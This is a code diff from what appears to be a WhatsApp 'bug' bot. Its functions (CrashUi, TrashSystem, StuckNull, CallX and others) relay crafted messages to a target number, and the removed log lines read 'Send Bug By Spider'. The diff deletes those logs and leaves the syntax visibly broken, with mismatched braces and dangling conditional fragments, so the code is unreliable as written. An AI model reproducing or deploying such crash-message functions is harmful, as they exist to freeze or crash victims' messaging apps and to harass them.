@@ -461,10 +461,9 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 				participant: {
 					jid: target
 				}
-			} : {});
-			console.log(chalk.green("Send Bug By Spider〽️"));
-		};
-		
+				}
+			}
+
 				async function ClPmNull(target, Qrad, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
 				proto.Message.fromObject({
@@ -539,10 +538,11 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 			await sam.relayMessage(target, etc.message, ptcp ? {
 				participant: {
 					jid: target
+				
+				
 				}
-			} : {});
-			console.log(chalk.green("Send Bug By Spider-V9〽️"));
-		};
+			}
+		}
 
 		async function StuckNull(target, spider, Ptcp = true) {
 			await sam.relayMessage(target, {
@@ -616,10 +616,9 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 					participant: {
 						jid: target
 					}
-				} : {}
-			);
-			console.log(chalk.green("Send Bug By spider-v9〽️"));
-		};
+				}
+					     
+					       }
 		
 		
 		const Qrad = {
@@ -736,9 +735,9 @@ async function ZnXIvS(target, Ptcp = true) {
     participant: {
      jid: target
     }
-   } : {});
-   console.log(chalk.green("Send Bug By Spider V9〽️"));
-  };
+   } 
+ 
+}
 async function TrashSystem(target, spider, Ptcp = true) {
    await sam.relayMessage(target, {
      ephemeralMessage: {
@@ -813,10 +812,9 @@ async function TrashSystem(target, spider, Ptcp = true) {
      participant: {
       jid: target
      }
-    } : {}
-   );
-   console.log(chalk.green("Send Bug By Spider〽️"));
-  };
+    } 
+   
+}
 async function CrashUi(target, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
 				proto.Message.fromObject({
@@ -892,9 +890,9 @@ async function CrashUi(target, spider, cct = false, ptcp = false) {
 				participant: {
 					jid: target
 				}
-			} : {});
-			console.log(chalk.green("Send Bug By 🕷️"));
-		};
+			} 
+			
+}
 	
 async function CallX(target, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
@@ -995,9 +993,9 @@ async function CallX(target, spider, cct = false, ptcp = false) {
 				participant: {
 					jid: target
 				}
-			} : {});
-			console.log(chalk.green("Send Bug By Spider"));
-		};
+			} 
+			
+}
 										
 //================================================//
 async function crtVid(url) {
